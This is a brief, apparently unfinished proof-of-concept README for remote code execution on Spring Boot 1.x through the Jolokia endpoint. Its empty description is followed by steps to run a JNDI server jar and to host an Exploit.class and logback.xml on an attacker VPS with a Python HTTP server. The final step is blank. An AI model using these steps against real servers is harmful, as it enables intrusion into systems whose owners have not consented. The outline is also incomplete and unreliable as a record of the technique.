## Spring Boot 1.x RCE with Jolokia

### Description


### PoC

1. ```java -jar /exp/jdniserver/target/jdniserver-1.0-SNAPSHOT.jar```


2. put the /exp/Exploit.class and logback.xml in VPS and start a httpserver in current directory by ```python3 -m http.server 8081```

3. 